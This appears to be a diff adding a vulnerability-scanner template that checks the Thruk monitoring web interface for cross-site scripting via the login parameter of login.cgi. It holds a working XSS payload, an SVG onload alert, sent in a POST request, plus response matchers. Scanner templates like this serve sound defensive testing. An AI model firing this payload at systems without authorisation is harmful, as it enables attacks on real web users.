@@ -1,0 +1,32 @@
+id: thruk-xss
+brief:
+    title: Thruk Monitoring Webinterface - Cross-Site Scripting
+    by: pikpikcu
+    level: high
+    about: Thruk Monitoring Webinterface contains a cross-site scripting vulnerability via the login parameter at /thruk/cgi-bin/login.cgi.
+    label:
+        - thruk
+        - xss
+        - vuln
+    score: CVSS:7.2
+moves:
+    - verb: POST
+      to:
+        - '{{BaseURL}}/thruk/cgi-bin/login.cgi'
+      head:
+        Content-Type: application/x-www-form-urlencoded
+      body: referer=&login=%22%3Csvg%2Fonload%3Dalert%28document.domain%29%3E%22%40gmail.com&password=test&submit=Login
+      signs:
+        - "on": word
+          has:
+            - <svg/onload=alert(document.domain)>"@gmail.com') called at
+          in: body
+          need: all
+        - "on": word
+          has:
+            - text/html
+          in: header
+          need: all
+        - "on": status
+          status:
+            - 500
